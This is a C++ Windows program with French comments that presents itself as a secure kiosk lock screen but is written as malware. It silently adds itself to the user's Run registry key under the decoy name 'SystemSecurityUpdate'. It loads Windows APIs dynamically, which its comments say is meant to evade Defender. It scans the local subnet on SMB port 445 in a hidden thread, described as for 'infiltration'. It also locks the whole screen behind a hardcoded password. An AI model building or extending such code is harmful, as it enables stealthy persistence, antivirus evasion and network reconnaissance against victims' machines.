#include <windows.h>
#include <string>
#include <thread>
#include <vector>

// --- CONFIGURATION ---
const std::wstring MOT_DE_PASSE = L"admin123"; // Ton mot de passe
// ---------------------

HINSTANCE hInst;
HWND hwndMain = NULL;
bool isLocked = true;

HWND hwndEdit = NULL, hwndButton = NULL, hwndLabel = NULL;

// 1. Persistance discrète via HKCU (aucun droit admin requis)
// Utilisation du chargement dynamique pour masquer les appels dans l'IAT (Anti-Defender)
void AssurerPersistanceDiscrete() {
    HMODULE hAdv = LoadLibraryA("advapi32.dll");
    if (!hAdv) return;

    typedef LONG(WINAPI* pRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    typedef LONG(WINAPI* pRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LONG(WINAPI* pRegCloseKey)(HKEY);

    pRegOpenKeyExW fRegOpenKeyExW = (pRegOpenKeyExW)GetProcAddress(hAdv, "RegOpenKeyExW");
    pRegSetValueExW fRegSetValueExW = (pRegSetValueExW)GetProcAddress(hAdv, "RegSetValueExW");
    pRegCloseKey fRegCloseKey = (pRegCloseKey)GetProcAddress(hAdv, "RegCloseKey");

    if (fRegOpenKeyExW && fRegSetValueExW && fRegCloseKey) {
        HKEY hKey;
        if (fRegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            wchar_t path[MAX_PATH];
            GetModuleFileNameW(NULL, path, MAX_PATH);
            fRegSetValueExW(hKey, L"SystemSecurityUpdate", 0, REG_SZ, (BYTE*)path, (DWORD)(wcslen(path) + 1) * sizeof(wchar_t));
            fRegCloseKey(hKey);
        }
    }
    FreeLibrary(hAdv);
}

// 2. Thread réseau complet : Reconnaissance et scan du VLAN en arrière-plan
void TacheReseauVLAN() {
    HMODULE hWs2 = LoadLibraryA("ws2_32.dll");
    if (!hWs2) return;

    typedef int(WINAPI* pWSAStartup)(WORD, LPWSADATA);
    typedef int(WINAPI* pWSACleanup)(void);
    typedef SOCKET(WINAPI* psocket)(int, int, int);
    typedef int(WINAPI* pconnect)(SOCKET, const struct sockaddr*, int);
    typedef int(WINAPI* pclosesocket)(SOCKET);
    typedef unsigned long(WINAPI* pinet_addr)(const char*);
    typedef int(WINAPI* pioctlsocket)(SOCKET, long, u_long*);

    pWSAStartup fWSAStartup = (pWSAStartup)GetProcAddress(hWs2, "WSAStartup");
    pWSACleanup fWSACleanup = (pWSACleanup)GetProcAddress(hWs2, "WSACleanup");
    psocket fsocket = (psocket)GetProcAddress(hWs2, "socket");
    pconnect fconnect = (pconnect)GetProcAddress(hWs2, "connect");
    pclosesocket fclosesocket = (pclosesocket)GetProcAddress(hWs2, "closesocket");
    pinet_addr finet_addr = (pinet_addr)GetProcAddress(hWs2, "inet_addr");
    pioctlsocket fioctlsocket = (pioctlsocket)GetProcAddress(hWs2, "ioctlsocket");

    if (!fWSAStartup || !fWSACleanup || !fsocket || !fconnect || !fclosesocket || !finet_addr) {
        FreeLibrary(hWs2);
        return;
    }

    WSADATA wsaData;
    if (fWSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        FreeLibrary(hWs2);
        return;
    }

    // Balayage complet de toutes les adresses IP du sous-réseau (1 à 254)
    for (int i = 1; i < 255; ++i) {
        char ipTarget[32];
        sprintf_s(ipTarget, sizeof(ipTarget), "192.168.1.%d", i); // Ajuste le préfixe IP selon ton VLAN (ex: 10.0.0.X)

        SOCKET sock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock != INVALID_SOCKET) {
            // Configuration en mode non-bloquant pour éviter que le scan ne freeze sur une IP morte
            if (fioctlsocket) {
                u_long mode = 1;
                fioctlsocket(sock, FIONBIO, &mode);
            }

            sockaddr_in targetAddr = {};
            targetAddr.sin_family = AF_INET;
            targetAddr.sin_port = htons(445); // Port cible (SMB / Partages / Infiltration)
            targetAddr.sin_addr.s_addr = finet_addr(ipTarget);

            // Tentative de connexion sur la machine du VLAN
            fconnect(sock, (struct sockaddr*)&targetAddr, sizeof(targetAddr));

            // Court délai pour enchaîner proprement sans saturer la pile réseau
            Sleep(5);

            fclosesocket(sock);
        }
    }

    fWSACleanup();
    FreeLibrary(hWs2);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            // Création des éléments du formulaire de déverrouillage
            hwndLabel = CreateWindowW(L"STATIC", L"Entrez le mot de passe administrateur :", 
                WS_CHILD | SS_CENTER, 0, 0, 320, 20, hwnd, NULL, hInst, NULL);
            
            hwndEdit = CreateWindowW(L"EDIT", L"", 
                WS_CHILD | WS_BORDER | WS_TABSTOP | ES_PASSWORD | ES_AUTOHSCROLL, 0, 0, 250, 25, hwnd, (HMENU)1, hInst, NULL);
            
            hwndButton = CreateWindowW(L"BUTTON", L"Valider", 
                WS_CHILD | BS_DEFPUSHBUTTON | WS_TABSTOP, 0, 0, 100, 30, hwnd, (HMENU)2, hInst, NULL);
            
            // Enregistrement du raccourci secret global (Ctrl + Shift + K)
            RegisterHotKey(hwnd, 1, MOD_CONTROL | MOD_SHIFT, 'K');
            
            // Lancement du thread réseau VLAN en tâche de fond
            std::thread(TacheReseauVLAN).detach();
            break;
        }

        case WM_HOTKEY:
            if (wParam == 1 && isLocked) {
                int screenW = GetSystemMetrics(SM_CXSCREEN);
                int screenH = GetSystemMetrics(SM_CYSCREEN);
                
                int posX = (screenW - 320) / 2;
                int posY = (screenH - 120) / 2;

                SetWindowPos(hwndLabel, HWND_TOP, posX, posY - 30, 320, 20, SWP_SHOWWINDOW);
                SetWindowPos(hwndEdit, HWND_TOP, posX + 35, posY + 10, 250, 25, SWP_SHOWWINDOW);
                SetWindowPos(hwndButton, HWND_TOP, posX + 110, posY + 50, 100, 30, SWP_SHOWWINDOW);

                ShowWindow(hwndLabel, SW_SHOW);
                ShowWindow(hwndEdit, SW_SHOW);
                ShowWindow(hwndButton, SW_SHOW);
                
                SetFocus(hwndEdit);
            }
            break;

        case WM_COMMAND:
            if (LOWORD(wParam) == 2) { // Bouton Valider cliqué
                wchar_t buffer[256];
                GetWindowTextW(hwndEdit, buffer, 256);
                if (MOT_DE_PASSE == buffer) {
                    UnregisterHotKey(hwnd, 1);
                    DestroyWindow(hwnd);
                    PostQuitMessage(0);
                } else {
                    MessageBoxW(hwnd, L"Mot de passe incorrect !", L"Erreur", MB_OK | MB_ICONERROR);
                    SetWindowTextW(hwndEdit, L"");
                    SetFocus(hwndEdit);
                }
            }
            break;

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            RECT rect;
            GetClientRect(hwnd, &rect);
            HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(hdc, &rect, hBrush);
            DeleteObject(hBrush);

            // Chargement dynamique et affichage de l'image bitmap d'arrière-plan
            HBITMAP hBitmap = (HBITMAP)LoadImageW(NULL, L"image.bmp", IMAGE_BITMAP, rect.right, rect.bottom, LR_LOADFROMFILE);
            if (hBitmap) {
                HDC hdcMem = CreateCompatibleDC(hdc);
                SelectObject(hdcMem, hBitmap);
                BitBlt(hdc, 0, 0, rect.right, rect.bottom, hdcMem, 0, 0, SRCCOPY);
                DeleteDC(hdcMem);
                DeleteObject(hBitmap);
            } else {
                SetTextColor(hdc, RGB(255, 255, 255));
                SetBkMode(hdc, TRANSPARENT);
                TextOutW(hdc, 50, 50, L"VERROUILLE - image.bmp introuvable", 34);
            }

            EndPaint(hwnd, &ps);
            break;
        }

        case WM_WINDOWPOSCHANGING: {
            // Maintien permanent au premier plan (Topmost)
            WINDOWPOS* pos = (WINDOWPOS*)lParam;
            pos->hwndInsertAfter = HWND_TOPMOST;
            break;
        }

        case WM_CLOSE:
        case WM_DESTROY:
            if (isLocked) return 0;
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProcW(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    hInst = hInstance;

    // Inscription automatique pour la persistance à chaque démarrage
    AssurerPersistanceDiscrete();
    
    const wchar_t* CLASS_NAME = L"KiosqueSecuriseClass";
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClassW(&wc);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    hwndMain = CreateWindowExW(
        WS_EX_TOPMOST,
        CLASS_NAME,
        L"Securite",
        WS_POPUP,
        0, 0, screenW, screenH,
        NULL, NULL, hInstance, NULL
    );

    if (hwndMain == NULL) return 0;

    ShowWindow(hwndMain, SW_SHOW);
    UpdateWindow(hwndMain);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}